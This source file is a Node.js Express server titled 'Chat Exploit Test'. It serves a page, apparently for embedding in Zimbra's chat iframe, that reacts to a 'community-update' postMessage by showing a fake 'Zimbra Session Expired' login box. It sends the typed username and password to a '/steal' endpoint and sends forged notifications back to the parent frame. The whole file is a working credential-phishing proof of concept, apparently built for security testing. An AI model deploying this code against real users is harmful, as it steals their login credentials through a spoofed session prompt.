const express = require('express');
const http = require('http');

const app = express();
const server = http.createServer(app);

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>Chat Exploit Test</title>
        <style>
          body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
          #output { margin-top: 10px; border: 1px solid #ccc; padding: 10px; min-height: 100px; }
          #login-prompt {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: white; padding: 20px; border: 1px solid #ccc; box-shadow: 0 0 10px rgba(0,0,0,0.3);
            z-index: 10000; display: none;
          }
          #login-prompt input { display: block; margin: 10px 0; padding: 5px; width: 200px; }
          #login-prompt button { padding: 5px 10px; }
        </style>
      </head>
      <body>
        <h1>Chat Exploit Test</h1>
        <div id="output">Waiting for messages from Zimbra...</div>
        <div id="login-prompt">
          <h3>Zimbra Session Expired</h3>
          <p>Please re-enter your credentials to continue:</p>
          <input type="text" id="username" placeholder="Username" />
          <input type="password" id="password" placeholder="Password" />
          <button onclick="submitCredentials()">Login</button>
        </div>
        <script>
          var outputDiv = document.getElementById('output');
          var loginPrompt = document.getElementById('login-prompt');

          function submitCredentials() {
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            if (username && password) {
              fetch('http://localhost:3001/steal?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password), { mode: 'no-cors' });
              outputDiv.innerHTML += '<p>Credentials submitted: ' + username + '</p>';
              loginPrompt.style.display = 'none';
            }
          }

          window.addEventListener('message', function(event) {
            console.log('Message received:', event.data, 'Origin:', event.origin);
            if (event.data === 'type=community-update') {
              outputDiv.innerHTML += '<p>Received community-update from ' + event.origin + ' at ' + new Date().toLocaleTimeString() + '</p>';
              loginPrompt.style.display = 'block';
              var fakeNotification = 'type=community-notification&unread=true';
              event.source.postMessage(fakeNotification, event.origin);
              console.log('Sent fake notification back');
            } else {
              outputDiv.innerHTML += '<p>Received other message: ' + event.data + ' from ' + event.origin + '</p>';
            }
            outputDiv.scrollTop = outputDiv.scrollHeight;
          }, false);

          window.parent.postMessage('Iframe loaded', '*');
          console.log('Iframe loaded, notified parent');
        </script>
      </body>
    </html>
  `);
});

const port = process.env.PORT || 4000;
server.listen(port, () => {
  console.log('Chat server running on port', port);
});